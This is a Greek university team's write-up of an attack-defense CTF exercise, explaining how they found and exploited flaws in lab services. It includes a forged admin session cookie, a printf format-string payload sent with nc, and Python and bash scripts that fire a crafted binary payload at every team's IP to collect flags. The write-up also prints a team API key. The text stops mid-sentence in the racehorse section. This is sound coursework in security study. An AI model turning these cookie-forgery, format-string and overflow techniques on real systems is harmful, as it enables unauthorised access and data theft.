# Homework #3 Write-up

- [Team Details](#team-details)
- [Playing an Attack-Defense CTF Competition](#playing-an-attack-defense-ctf-competition)
- [Service Exploits](#service-exploits)
- [Service Patches](#service-patches)
- [Forensics: .pcap Network Traffic Analysis with Wireshark](#forensics-pcap-network-traffic-analysis-with-wireshark)
- [Automation - Exploits & Flags Submission](#automation---exploits--flags-submission)
- [Attack & Defence Strategies, Delegation of duties](#attack--defence-strategies-delegation-of-duties)
- [Lessons learned -- What would we do differently if we did this again?](#lessons-learned----what-would-we-do-differently-if-we-did-this-again)

## Team Details

Team name: **Chimera Agents** <br>
Team number & IP address: **team03 (`10.219.255.10`)** <br>
Number of contributors: **6**

- **sdi2200284** - [Αλέξανδρος Γκιάφης (AlexTuring010)](https://github.com/AlexTuring010)
- **sdi2000057** - [Ορφέας Ηλιάδης (DrCeem)](https://github.com/DrCeem)
- **sdi2000150** - [Θεόδωρος Μωραΐτης (sdi2000150)](https://github.com/moraitisteo)
- **sdi1800166** - [Κωνσταντίνος Ρούσσος (sdi1800166)](https://github.com/sdi1800166)
- **sdi1800122** - [Εμίλ Μπαντάκ (EmilBa122)](https://github.com/EmilBa122)
- **sdi1700254** - [Πιέρρο Ζαχαρέας (plerros)](https://github.com/plerros)

## Playing an Attack-Defense CTF Competition

Για όλους μας αυτή ήταν η πρώτη φορά που συμμετείχαμε σε διαγωνισμό τύπου Attack-Defense CTF. Δεν είχαμε προηγούμενη εμπειρία, οπότε ανυπομονούσαμε να δούμε πώς είναι στην πράξη και να δοκιμάσουμε τις δυνάμεις μας τόσο στην επίθεση όσο και στην άμυνα. Η όλη διαδικασία ήταν μια ευκαιρία να μάθουμε καινούρια πράγματα και να συνεργαστούμε ως ομάδα σε "πραγματικές" συνθήκες.

Πριν την έναρξη, δόθηκαν αναλυτικές οδηγίες και κανόνες για το παιχνίδι:

- **Rule #1:** Παίζουμε δίκαια. Δεν επιτρέπονται προσπάθειες για root access, DoS, επιθέσεις στην υποδομή ή στους συμφοιτητές/διδάσκοντες. Στόχος είναι να εξάγουμε flags και να τα υποβάλουμε, όχι να καταστρέψουμε συστήματα.
- **Rule #2:** Ακολουθούμε τον κανόνα #1.

Κάθε ομάδα ξεκινούσε με το ίδιο σετ υπηρεσιών σε ένα παρόμοια ρυθμισμένο Linux box. Τα credentials για πρόσβαση στο δίκτυο και το μηχάνημα δίνονταν μέσω του repository της ομάδας. Όλα τα μηχανήματα βρίσκονταν στο ίδιο δίκτυο (10.219.255.XX) και μπορούσαμε να τα εντοπίσουμε με ping/nmap κλπ. Ο default user ήταν ο `ctf` με sudo δικαιώματα μόνο για τα συγκεκριμένα services.

Ο διαγωνισμός διήρκεσε 48 ώρες, χωρισμένος σε windows των 15 λεπτών. Σε κάθε window, τα flags ανανεώνονταν για κάθε υπηρεσία. Δεν επιτρεπόταν η διαγραφή των flags. Κάθε υπηρεσία έπρεπε να παραμένει λειτουργική και να περνάει τους ελέγχους SLA, αλλιώς υπήρχε μεγάλη ποινή στη βαθμολογία.

Στόχοι:

1. Να διατηρούμε τις υπηρεσίες μας λειτουργικές και παρόμοιες με το αρχικό service (εκτός από τα vulnerabilities που μπορούσαμε να patchάρουμε).
2. Να προστατεύουμε τα flags μας από επιθέσεις άλλων ομάδων, κάνοντας patch όπου χρειάζεται.
3. Να κάνουμε exploit τις υπηρεσίες των άλλων ομάδων και να υποβάλλουμε τα flags που βρίσκουμε.

Η υποβολή των flags γινόταν μέσω API με το api_key της ομάδας μας. Κάθε flag που υποβαλλόταν έδινε 2 πόντους, κάθε flag που χάναμε αφαιρούσε 2 πόντους, ενώ η διατήρηση της υπηρεσίας χωρίς απώλεια λειτουργικότητας έδινε 42 πόντους ανά time window.

Συνολικά συμμετείχαν 16 ομάδες (με μέχρι 6 άτομα η κάθε μία). Οι IP διευθύνσεις των υπόλοιπων ομάδων ήταν:
<br>
`10.219.255.2` `10.219.255.6` `10.219.255.14` `10.219.255.18`
`10.219.255.22` `10.219.255.26` `10.219.255.30` `10.219.255.34`
`10.219.255.38` `10.219.255.42` `10.219.255.46` `10.219.255.50`
`10.219.255.54` `10.219.255.58` `10.219.255.62`
<br>

---

## Service Exploits

(🗡 --> exploited)

### 🗡 pwnazon

_[Web service running on port `8005`]_ <br><br>

Βρήκαμε δύο απλές επιθέσεις σε αυτό το service.

### 1. Δημόσια πρόσβαση στο σύστημα αρχείων

Η πρώτη ήταν ότι το **σύστημα αρχείων ήταν εκτεθειμένο**. Οποιοσδήποτε μπορούσε να καλέσει απευθείας το αρχείο `/key` με τη χρήση του URL. Αυτό πήρε κάποιο χρόνο για να το διορθώσουμε (θα επανέλθω για το πώς το διόρθωσα).

### 2. backdoor μέσω cookie

Το δεύτερο vulnerability ήταν ουσιαστικά **ένα backdoor που επέστρεφε την σημαία**, κρυμμένο μέσα στον κώδικα χειρισμού καλαθιού:

```php
if ($item["name"] === "FLAG") {
  $flag_file = fopen("key","r") or die ("NO KEY FILE");
  $flag = " - ".fread($flag_file, filesize("key"));
}
```

Αυτό δεν ήταν προορισμένο για τον POLLER να το χτυπήσει — σε άλλα services, ο POLLER έπρεπε να χρησιμοποιήσει το πραγματικό flag ως κλειδί για να λάβει απάντηση. Αλλά εδώ, αν το καλάθι σου περιείχε ένα αντικείμενο με το όνομα `"FLAG"`, απλά θα λάμβανε το flag. Τέτοιο είδος αντικειμένου δε θα έπρεπε να υπάρχει, το κατάστημα πουλά μόνο βιβλία.

Έτσι μπορούσες **να κάνεις forge ένα cookie** με ένα αντικείμενο καλαθιού που να ονομάζεται `"FLAG"`. Έγραψαμε ένα script που κάνει το παραπάνω:

```python
import urllib.parse
import phpserialize

data = {
  'cart': [
    {
      'name': 'FLAG',
      'price': 9,
      'restricted': False,
      'desc': 'Αυτό είναι ένα σημαία. Μπορείτε να το αποκτήσετε.'
    },
    {
      'name': 'FLAG',
      'price': 0,
      'restricted': False,
      'desc': 'Δεύτερο σημαία για δοκιμή.'
    }
  ]
}

serialized = phpserialize.dumps(data)
encoded = urllib.parse.quote(serialized)
print("Πλαστογραφημένο cookie:\n")
print(encoded)
```

### 3. login vulnerability

Στο login page μπορούσες να ανοίξεις το webshell και να εκτελέσεις το `document.cookie = 'STATE=' + encodeURIComponent('a:1:{s:5:"admin";b:1;}');` στο console, με αποτέλεσμα να αλλάξεις το session σε admin. Με αυτό τον τρόπο μπορούσες να προσθέσεις το προϊόν του flag στο καλάθι.

Στις υπόλοιπες ομάδες το κάναμε exploit ως εξής:
Φτιάχναμε ένα δικό μας session cookie που περιείχε το προϊόν του flag και είχε το admin status set σε true.

```
cookie="STATE=a%3A2%3A%7Bs%3A5%3A%22admin%22%3Bb%3A1%3Bs%3A4%3A%22cart%22%3Ba%3A3%3A%7Bi%3A0%3Ba%3A4%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22FLAG%22%3Bs%3A5%3A%22price%22%3Bd%3A9999999.99%3Bs%3A10%3A%22restricted%22%3Bb%3A1%3Bs%3A4%3A%22desc%22%3Bs%3A64%3A%22This%20is%20the%20flag.%20If%20you%20put%20this%20in%20your%20cart%2C%20you%20can%20view%20it%21%22%3B%7Di%3A1%3Ba%3A4%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22FLAG%22%3Bs%3A5%3A%22price%22%3Bd%3A9999999.99%3Bs%3A10%3A%22restricted%22%3Bb%3A1%3Bs%3A4%3A%22desc%22%3Bs%3A64%3A%22This%20is%20the%20flag.%20If%20you%20put%20this%20in%20your%20cart%2C%20you%20can%20view%20it%21%22%3B%7Di%3A2%3Ba%3A4%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22FLAG%22%3Bs%3A5%3A%22price%22%3Bd%3A9999999.99%3Bs%3A10%3A%22restricted%22%3Bb%3A1%3Bs%3A4%3A%22desc%22%3Bs%3A64%3A%22This%20is%20the%20flag.%20If%20you%20put%20this%20in%20your%20cart%2C%20you%20can%20view%20it%21%22%3B%7D%7D%7D"
```

Το κάναμε curl στο cart.php και από το response απομονώναμε ότι βρισκόταν μέσα στο tag του flag

```
<td>FLAG - 5070df334f86710ac312f67dcdbddd91cc023c19335268038177a341e0840939</td>
```

### 4. Pwnazon potential XSS vulnerability

Στη σελίδα του browse, εντοπίσαμε στην $\_POST['search'] το input του χρήστη χρησιμοποιούταν απευθείας χωρίς sanitization.

```
echo preg_replace("($search)", "<b style='color:#04f'>$0</b>", $s);
```

Δεν μπορέσαμε να πραγματοποιήσουμε κάποιο exploit, ούτε προχωρήσαμε σε patch, αλλά καταγράφτηκε ως πιθανό vulnerability.

### 🗡 bananananana

_[Web service running on port `8003`]_ <br><br>

Βρήκαμε μια επίθεση σε αυτό το service μόνο. Αν και είμαστε σίγουρι ότι υπήρχαν και άλλες, δεν προλάβαμε να το εξερευνήσουμε περισσότερο, απο wireshark πιστεύουμε ότι κάπου γινόταν command injection.

Σίγορυρα όμως, όπως και στο pwnazon, ένα vulnerability ήταν ότι το **σύστημα αρχείων ήταν εκτεθειμένο**. Οποιοσδήποτε μπορούσε να καλέσει απευθείας το αρχείο `/key` με τη χρήση του URL.

### 🗡 auth

_[Binary service running on port `8000`]_

#### 1o vulnerabilty

Αυτό ήταν το πρώτο binary που κάναμε exploit, και ευτυχώς αποδείχθηκε πιο εύκολο από τα υπόλοιπα.

Ξεκίνησα βάζοντας το binary στο Ghidra για decompilation. Μετά μετέφερα τον κώδικα στο VS Code και άρχισα να τον αναλύω ενώ ταυτόχρονα έτρεχα το binary για να συσχετίσω τη λειτουργία με τον κώδικα. Χρησιμοποίησα copilot για να με βοηθήσει να μετονομάσω μεταβλητές στις συναρτήσεις που κοίταζα, κάτι που έκανε τον κώδικα πιο ευανάγνωστο και με βοήθησε να προχωρήσω πιο γρήγορα.

Εντόπισα ένα κλασικό format string vulnerability: όταν έκανε list τους χρήστες, περνούσε τα usernames απευθείας σαν πρώτο argument στο `printf`, χωρίς να τα κάνει sanitize. Αυτό μου επέτρεπε να διαβάσω ή και να γράψω στην μνήμη μέσω `%n`.

Τα user structs αποθηκεύονταν στο heap, και τα `username`/`password` ήταν pointers μέσα στο struct. Αρχικά προσπάθησα να διαβάσω τον κωδικό του admin σκανάροντας τη στοίβα, αλλά τίποτα ήταν προφανώς αποθηκευμένο κάπου στο heap.

Παρατήρησα όμως ότι όταν καλούταν το `printf`, υπήρχε pointer στο user struct μου στο stack, συγκεκριμένα ο pointer έδειχνε στο πρώτο πεδίο του struct, το οποίο είναι ο `username` pointer. Έτσι μου ήρθε η ιδέα.

Κρίσιμη λεπτομέρεια: οι διευθύνσεις μνήμης παραμένουν σταθερές μεταξύ εκτελέσεων.

Με `%n` μπορώ να γράψω τον αριθμό χαρακτήρων που έχουν ήδη εκτυπωθεί σε μια θέση μνήμης που δείχνει ένας pointer από το stack. Δεν μπορούσα να βάλω custom pointer στο stack, αλλά μπορούσα να χρησιμοποιήσω pointers που υπάρχουν ήδη, όπως ο pointer που δείχνει στο struct μου.

Μετά από πολύ σκέψη, αποφάσησα να κάνω το εξής: να χρησιμοποιήσω `%n` για να αλλάξω το pointer στο δικό μου `username`, ώστε να δείχνει στο `password` του admin. Έτσι, όταν γίνεται `list`, θα εκτυπώνεται ο κωδικός του admin αντί για το username μου.

Χρησιμοποίησα το GDB για να υπολογίσω:

- Το offset ανάμεσα στο πρώτο argument του `printf` και τη διεύθυνση της user struct
- Τη διεύθυνση του κωδικού του admin

Το να γράψω ολόκληρη 64-bit διεύθυνση με `%n` δεν ήταν πρακτικό (θα χρειαζόταν γελοία μεγάλος αριθμός χαρακτήρων). Όμως τα υψηλά bits ήδη ταίριαζαν, οπότε αρκούσε ένα `%hn` για να γράψω μόνο τα χαμηλά 2 bytes.

Το payload που χρησιμοποίησα ήταν:

```bash
echo -e "create %45920x%7\$hn 123123\nlist\nlist\nquit\n" | nc 10.219.255.34 8000
```

Τι κάνει:

1. Δημιουργεί χρήστη με username `%45920x%7$hn`. Το `%45920x` εκτυπώνει 45920 χαρακτήρες και το `%7$hn` γράφει αυτήν την τιμή (ως 2 bytes) εκεί που δείχνει η 7μη παράμετρος της printf, που είναι ο pointer στο username μου.
2. Το πρώτο `list` ενεργοποιεί το `printf`, αλλάζοντας τον pointer του username μου.
3. Το δεύτερο `list` εκτυπώνει το "username", το οποίο τώρα θα πρέπει να είναι ο κωδικός του admin.
4. Ο κωδικός του admin είναι και το flag.

Η ιδέα είναι απλή, αλλά χρειαζόταν μεγάλη λεπτομέρια στο payload. Ο GDB με βοήθησε πολύ στους υπολογισμούς, αλλα η διαδικασία ήταν αργή.

#### 2ο vulnerabilty

Το επόμενο _vulnerability_ που βρήκαμε στο _auth service_ το εντοπίσαμε παρατηρώντας το _traffic_ του δικού μας _auth service_ μέσω των `pcap` αρχείων και με χρήση του `wireshark`, αναλύοντας τα payloads που μας είχαν σταλθεί σε αυτό (με φίλτρο στο port `8000`). Παρατηρήσαμε ότι όταν το _service_ δεχόταν inputs του τύπου _auth \_ n_ όπου _n = 0, 1 , 2 ..._ τότε συχνά μετά απο κάποιον αριθμό απο inputs το service έκανε "login" τον χρήστη ως _admin_ δίνοντας του έτσι την δυνατότητα να πάρει to flag. Δοκιμάσαμε "χειροκίνητα" μία επίθεση με αυτήν την στρατηγική και καταφέραμε να αποκτήσουμε _admin access_ και άρα το _flag_ και στην συνέχεια προσπαθήσαμε να αυτοματοποιήσουμε την διαδικασία με ένα _bash script_ που για κάθε ομάδα δοκιμάζει τα inputs _auth \_ n_ με _n = {0, 1, 2, ... , 10}_ και αν καταφέρει να αποκτήσει _admin access_ τότε παίρνει το flag και το κάνει submit με το _api key_ της ομάδας.

### 🗡 mapflix

_[Binary service running on port `8002`]_

#### Λειτουργία του Mapflix

Το πρώτο βήμα στην αποκωδικοποίηση της λειτουργίας του Mapflix service ήταν να μετάφερουμε ένα αντίγραφου του binary αρχείου τοπικά με σκοπό να αναλύσουμε την assembly και να επιχειρίσουμε να κάνουμε decompile το εκτελέσιμο του service. Με χρήση εργαλίων όπως το `dogbolt` που παρέχει _decompilers_ όπως το _Ghidra_ και το _Binary Ninja_ καταφέραμε να μετατρέψουμε το πρόγραμμα _assembly_ σε ένα ισοδύναμο πηγαίο πρόγραμμα C. Αυτό μας επέτρεψε να κατανοήσουμε ευκολότερα και κυρίως ταχύτερα την λειτουργικότητα του προγράμματος, καθώς και πιθανά vulnerabilities που θα άνοιγαν πόρτες για επιθέσεις στο flag. Μετά από αναλύση του decompiled C κώδικα και διαφορετικές πειραματικές εκτέλεσεις του service καταλήξαμε σε μία βασική δομή της λειτουργικότητας του service:

1. Αρχικά ρωτούσε τον χρήστη αν ήθελε να ανεβάσει ένα δικό του **Map**.
2. Αν η απάντηση ήταν "Ναι" (`"y"`), τότε ζήταγε από τον χρήστη να εισάγει από το _standard input_ ένα αρχείο τύπου **Map** με συγκεκριμένο _format_ για το _header_ του αρχείου καθώς και την δομή του.
3. Μόλις ο χρήστης εισήγαγε ένα έγκυρο input που ταίριαζε στην δομή του **Map** αρχείου το πρόγραμμα ρωτούσε αν ο χρήστης ήθελε να κάνει _sign_ το **Map** αρχείο με κάποιο κλειδί.
4. Αν η απάντηση ήταν Ναι" (`"y"`), τότε το πρόγραμμα ζητούσε από τον χρήστη να δώσει το _master key_ (flag). Αν ο χρήστης είσηγαγε σωστά το _master key_ τότε το πρόγραμμα χρησιμοποιούσε αυτό για να κάνει _sign_ το map, αλλίως χρησιμοποιούσε το key που έδινε ο χρήστης.
5. Στην συνέχεια το πρόγραμμα ρωστούσε τον χρήστη αν θέλει να κάνει _render_ το **Map** του, και αν η απάντηση ήταν "Ναι" (`"y"`) τότε το πρόγραμμα το εκτύπωνε στο _standard output_.
6. Τέλος το πρόγραμμα ρωτούσε τον χρήστη αν θέλει να επναλάβει όλη την διαδικασία και αν ο χρήστης απαντούσε "Ναι" (`"y"`), τότε επαναλαμβανόταν η εκτέλεση στα βήματα 1-5. Σε αντίθετη περίπτωση το πρόγραμμα ολοκλήρωνε την εκτέλεση του.

Παρατηρώντας αναλυτικά τον κώδικα που αφορούσε την εισαγωγή του **Map** αρχείου και συγκεκριμένα το _parse_ στo _header_ και στο _body_ του αρχείου, συμπαιράναμε ότι οι βασικές πληροφορίες του header αποτελούσαν πληροφορίες για το μέγεθος του αρχείου και χρησιμοποιούνταν για να την ανάγνωση του _body_. Ταυτόχρονα, παρατηρήσαμε ότι υπήρχε μια συνθήκη που έλεγχε αν οι πληροφορίες του _header_ που αφορούσαν το μέγεθος και την μορφή του map αντιστοιχούσαν στο πραγματικό μέγεθος του _body_ και αν δεν αντιστοιχούσαν το πρόγραμμα εκτύπωνε ένα προειδοποιητικό μήνυμα, χωρίς ωστόσο να αποτρέπει το συγκεκριμένο _input_ από το να επεξεργαστεί περαιτέρω. Συνεπώς, σκεφτήκαμε ότι υπάρχει σημαντική πιθανότητα να μπορούμε να κάνουμε _leak_ το flag μετά το _signing_ και το _rendering_ δίνοντας ένα αρχείο όπου οι πληροφορίες μεγέθους του _header_ δεν αντιστοιχούν με το πραγματικό μέγεθος του αρχείου.

#### Attack

Αρχικά επιχειρήσαμε να εισάγουμε διαφορετικά _payloads_ ψεύτικων αρχείων με _header_ που αντιστοιχούσε στο _format_ του service (`MPX!...`) με σκόπο να παρατηρήσουμε την συμπεριφόρα του προγράμματος. Η πρώτη δυσκολία που αντιμετωπίσαμε ήταν ότι προκειμένου να δημιουργήσουμε ένα τέτοιο _payload_ θα επρέπε στα _metadata_ του _header_ να συμπεριλαμβάνονται και bytes των οποίων οι _ascii_ χαρακτήρες δεν είναι _printable_. Συνεπώς έπρεπε να κατασκευάσουμε κάποιο _script_ που θα δημιουργεί ένα payload από _raw bytes_ και θα το στέλνει στο _service_ μόλις ζητηθεί η εισαγωγή του map. Στο σημείο αυτό αποφασίσαμε, με σκοπό να τεστάρουμε ένα τέτοιο _script_, να ψάξουμε για payloads που είχαν στείλει άλλες ομάδες στο δικό μας service. Αρχικά αντιγράψαμε τα πιο πρόσφατα `pcap` αρχεία τοπικά και έπειτα τα ανοίξαμε με το `wireshark` με σκοπό να παρατηρήσουμε το _traffic_ το οποίο δεχόμασταν στο συγκεκριμένο service. Είχαμε ήδη ανακλύψει ότι το _mapflix_ έτρεχε στο _port_ `8002`, συνεπώς φιλτράρωντας μόνο την κίνηση στο συγκεκριμένο _port_ μπορέσαμε να δούμε τις _TCP_ συνδέσεις σε αυτό καθώς και τα δεδομένα τα οποία μας είχαν σταλεί. Με αυτόν τον τρόπο εντοπίσαμε ακριβώς τα _payloads_ τα οποία είχαμε δεχτεί για να μας κλεψούν το _flag_ και μετατρέποντας τα σε _hexadecimal_ μπορέσαμε κατευθείαν να εξάγουμε τα _raw bytes_ του _payload_. Στην συνέχεια χρησιμοποιήσαμε το _hex payload_ για να παράξουμε το ψεύτικο αρχείο θα δίναμε ως _input_ στο _service_ με την χρήση ενός απλού _python script_:

```python
# Hex Payload
hex_str = (
    "4d5058212400000001000000100000001a001e001400000000000000140000004141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410042"
)

# Convert hex string to bytes
payload = bytes.fromhex(hex_str)

# Write the payload to a binary file
with open("mapflix_payload.bin", "wb") as f:
    f.write(payload)

```

Χρησιμοποιήσαμε το _binary_ αρχείο που κατασκευάσαμε για να πραγματοποιήσουμε μια δοκιμαστική επίθεση σε κάποια άλλη ομάδα, αυτοματοποιώντας την όλη επικοινωνία με ένα ακόμα python _script_:

```python
import socket
import sys
import os
import select
import termios
import tty
import time

# Initial configuration
HOST = '10.219.255.6'
PORT = 8002
PAYLOAD_FILE = 'map_payload.bin'

# Send the payload to the remote server
def send_payload(sock):
    print("[*] Sending payload...")
    try:
        # Do you want to upload your map?
        sock.sendall(b'y\n')
        time.sleep(0.2)

        # Upload your map first:
        with open(PAYLOAD_FILE, 'rb') as f:
            payload = f.read()
            sock.sendall(payload)

        # Do you want to sign your map?
        time.sleep(0.2)
        sock.sendall(b'y\n')

        # Prove you know the key:
        time.sleep(0.2)
        sock.sendall(b'AAAAAAAAAAAAAAAA\n')

        # Do you want to render your map?
        time.sleep(0.2)
        sock.sendall(b'y\n')

        # Do you want to do that again?
        time.sleep(0.2)
        sock.sendall(b'n\n')

    except Exception as e:
        print(f"[!] Error sending payload: {e}")
        sock.close()
        sys.exit(1)

def main():
    print(f"[*] Connecting to {HOST}:{PORT}...")
    try:
        sock = socket.create_connection((HOST, PORT))
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        sys.exit(1)

    send_payload(sock)
    sock.close()

if __name__ == '__main__':
    main()
```

Εκτελώντας αυτό το _script_ και παρατηρώντας το output εντοπίσαμε μια ακολουθία απο _bytes_ που είχε το _format_ του _flag_. Απομονώσαμε
τους χαρακτήρες του _flag_ και κάναμε _submit_ το πρώτο _flag_ με επιτυχία.
Τέλος έχοντας πλεόν δήμιουργήσει μια επιτυχή στρατηγική επίθεσης επιχειρήσαμε να αυτοματοποίησουμε την διακασία για όλες τις ομάδες με ένα _bash script_ που θα εκτελούσε την επίθεση σε κάθε ομάδα και σε κάθε _time window_:

```bash
#!/bin/bash

ips=(
    "10.219.255.2" "10.219.255.6" "10.219.255.14" "10.219.255.18"
    "10.219.255.22" "10.219.255.26" "10.219.255.30" "10.219.255.34"
    "10.219.255.38" "10.219.255.42" "10.219.255.46" "10.219.255.50"
    "10.219.255.54" "10.219.255.58" "10.219.255.62"
)

submit_url="https://ctf.hackintro25.di.uoa.gr/submit"
api_key="f99e197afa7122298b9b948accf205313ee28954a2af6a98710317f8dc80ea52"

PAYLOAD="map_payload.bin"
# --- VALIDATE ---
if [[ ! -f "$PAYLOAD" ]]; then
    echo "[!] File '$PAYLOAD' not found!"
    exit 1
fi

for ip in "${ips[@]}"; do

    echo "[+] Connecting to $ip:8000"

    # --- SEND PAYLOAD ---
    RESPONSE=$({
        echo "y"
        sleep 0.2
        cat "$PAYLOAD"
        sleep 0.2
        echo "y"
        sleep 0.2
        echo "AAAAAAAAAAAAAAAA"
        sleep 0.2
        echo "y"
        sleep 0.2
        echo "n"
    } | nc "$ip" 8002 -w 2 )

    echo "$RESPONSE"

    # Get the last 200 characters of the response
    tail_section=$(echo -n "$RESPONSE" | tail -c 200)

    # Extract the flag from the tail section
    flag=$(echo "$tail_section" \
        | grep -Eo '[a-fA-F0-9]{8,64}' \
        | tr -d '\n')

    # Print the extracted flag
    if [[ -n "$flag" ]]; then
        echo "[✓] Extracted flag: $flag"

        submit_response=$(curl --connect-timeout 15 --max-time 30 -s -w "%{http_code}" -o /tmp/submit_out \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer $api_key" \
            -d "{\"flag\": \"$flag\"}" \
            "$submit_url")

        if [[ "$submit_response" == "200" ]]; then
            echo "[✓] Flag submitted successfully!"
        else
            echo "[!] Submission failed: HTTP $submit_response"
            cat /tmp/submit_out
        fi
    else
        echo "[!] Flag not found in output"
    fi
done
```

Το script αυτό είχε την δυνατότητα να εξάγει το _flag_ απο το output του service (με την χρήση _regular expression_) και να το υποβάλει με το _API key_ της ομάδας αυτοματοποιώντας πλήρως την διαδικασία.

### ❌ powerball

_[Binary service running on port `8001`]_ <br><br>
Δεν καταφέραμε attack exploit στο powerball...
Δεν κατάφερα να λύσω το powerball δηλ να βρώ ένα attack αλλά γράφω μέχρι που είχα φτάσει και τι είχα κάνει

Αρχικά πάλι ανοίγω το terminal και γράφω το command `checksec powerball` για να δώ τι security defenses έχει αυτό το binary file και πέρνουμε
το εξής output

```bash
[*] '/home/user/Desktop/backup/powerball'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
```

Πάλι χρησιμοποιώ το dogbolt για να κάνω decompile το binary αρχείο αυτό και πήρα τον κώδικα σε c που εμφάνιζε το Hex-Rays

Παρατήρησα ότι υπάρχει μια κρυφή επιλογή στο μενού το 42 όπου ελέγχει τσάμπα το flag

Επίσης με την επιλογή test μπορούσες να τυπώσεις μια οποιαδήποτε θέση ενός πίνακα 1000000 θέσεων που όμως περιείχε το κλειδί

Έγραψα τον πρακάτω κώδικα σε python για να βρώ το κλειδί

Τι έκανα ουσιαστικά

Έπαιρνα μία τιμή μέσω της test και τη δοκίμαζα μέσω της επιλογής 42. Όμως κάθε δοκιμή κοστίζει 10 και επιπλέον το μενού μπορείς να το δεις 25
φορές μόνο

Παρακάτω είναι ο κώδικας που είχα φτιάξει για το powerball

```python
from pwn import *

p = process(['./powerball', '1', '1'], level='debug')

# Captcha
p.recvuntil(b":")
p.recvuntil(b":")
p.send(b"2\n")
# 1 + 1 = 2

# Main menu
p.recvuntil(b"Enter your choice (1-5): ")

# reshuffle
p.sendline(b"4")
p.recvuntil(b"Enter your choice (1-5): ")

for i in range(-3, 1000000):

  p.sendline(b"2")

  # Query
  p.recvuntil(b"query over the roulette data: ")
  query = f"el_{i}"
  p.sendline(query.encode())
  p.recvuntil(b"Query result: ")
  result = p.recvline().strip()
  print(i, result.decode())

  if result == "48":
    print('here')

  p.sendline(b"42")
  p.recvuntil(b"Guess the key: ")
  p.sendline(b""+result)
  p.recvuntil("It is incorrect")

p.close()
```

Όπως και με το racehorse έφτιαξα δικό μου key και captcha για να δώ ότι παίζει σωστά τοπικά και μετά θα μπορούσα να τον τροποποιήσω για να
τρέχει και για τις πραγματικές συνθήκες της άσκησης

Σημείωση  
Για να τρέξεις το python file μέσω args δίνεις το δικό σου key και captcha

Ο αριθμός που ψάχνουμε για key = 1 είναι το 48 (0x30) γιατί στον κώδικα υπάρχει η παρακάτω γραμμή  
`result = (*(_DWORD *)dest ^ (unsigned int)captcha_value) % 0xF4240;`  
η οποία δίνει αποτέλεσμα 48

Πιστεύω ότι η ύπαρξη της strcmp μέσα στον κώδικα που πέρναμε από το Hex-Rays θα έπεζε σίγουρα ουσιαστικό ρόλο για το attack αλλά είχα ξεμείνει
από χρόνο ουσιαστικά

Κάτι που επίσης βοήθησε ήταν όταν ένα μέλος της ομάδας μου βρήκε ένα payload που είχε σταλεί από άλλη ομάδα προς εμάς, καταγεγραμμένο μέσω Wireshark. Αυτό μας έδωσε ένα κρίσιμο hint.

Στόχευαν τη λειτουργία που επιτρέπει στους χρήστες να κάνουν evaluate εκφράσεις. Το payload τους ήταν γεμάτο με `1`s — και τελικά αποδείχτηκε ότι ο τρόπος που ο κώδικας χρησιμοποιούσε τη `strtok()` για να χωρίσει την είσοδο σε tokens, αντέγραφε τα αποτελέσματα (ως pointers σε strings) σε ένα buffer σταθερού μεγέθους. Το πρόβλημα; **Δεν χρησιμοποιούσε σωστό άνω όριο για το index του πίνακα**, και μπορούσες να κάνεις **buffer overflow**.

Υπολόγισα το offset — ίδιο με αυτό που είχαν χρησιμοποιήσει — 72 χαρακτήρες `1` και μετά το shellcode σου. Ο κώδικας θα έγραφε πάνω στη διεύθυνση επιστροφής έναν pointer που θα οδηγούσε στην εκτέλεση του shellcode σου.

Ωστόσο, παρ’ ότι είχα το σωστό offset, **τα payloads μου αποτύγχαναν**. Έκανα τις δοκιμές στο δικό μου local αντίγραφο του προγράμματος, αλλά αυτό αποδείχτηκε ότι ήταν η **αρχική έκδοση** — εκείνη όπου το heap **δεν ήταν εκτελέσιμο**. Έμαθα πως μια **δεύτερη έκδοση** της υπηρεσίας κυκλοφόρησε την επόμενη μέρα, αλλά εγώ δεν την είχα ενημερώσει ποτέ. Αυτό ίσως ήταν μέρος του προβλήματος. Το συνειδητοποίησα **μόνο αφού τελείωσε ο διαγωνισμός**.

Θυμάμαι επίσης ότι δοκίμασα το exploit και σε άλλες υπηρεσίες ομάδων, αλλά πάλι δεν πήρα αποτελέσματα. Ίσως το payload μου ήταν **ελαττωματικό**, ή ίσως ξέχασα να κάνω **flush την έξοδο αφού διάβαζα το αρχείο key**, και παρερμήνευσα τη σιωπή σαν αποτυχία. Τελικά κατέληξα στο συμπέρασμα ότι το heap δεν ήταν εκτελέσιμο και εγκατέλειψα την προσπάθεια.

Άρα, στο τέλος δεν καταφέραμε να κλέψουμε σημαίες με αυτό, αλλά **καταφέραμε να προστατέψουμε** τη δική μας υπηρεσία.

### 🗡 racehorse

_[Binary service running on port `8004`]_ <br><br>
**Αρχικός Τρόπος Προσεγγίσης Λανθασμένος**

Αρχικά κατέβασα το binary αρχείο (μαζί με τα άλλα αρχεία της εργασίας) locally και ανοίγωντας το terminal γράφω το command `checksec racehorse`
για να δώ τι security defenses έχει αυτό το binary file και πέρνουμε το εξής output

```bash
[*] '/home/user/Desktop/backup/racehorse'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Από το παραπάνω καταλαβαίνουμε ότι το binary έχει enable το PIE

Στην συνέχεια χρησιμοποίησα το dogbolt για να κάνω decompile το binary αρχείο αυτό και πήρα τους κώδικες σε c που εμφάνιζαν το ghidra και το
Hex-Rays και προσπάθησα να καταλάβω τι συμβαίνει με το αρχείο αυτό. Αρχικά πρώτη μου σκέψη ήταν που φορτώνεται το flag μέσου του Hex-Rays
εντοπίζω την συνάρτηση load_flag_and_urandom η οποία φορτώνει το flag στην μεταβλητή flag_buf (η οποία είναι μια καθολική μεταβλητή και
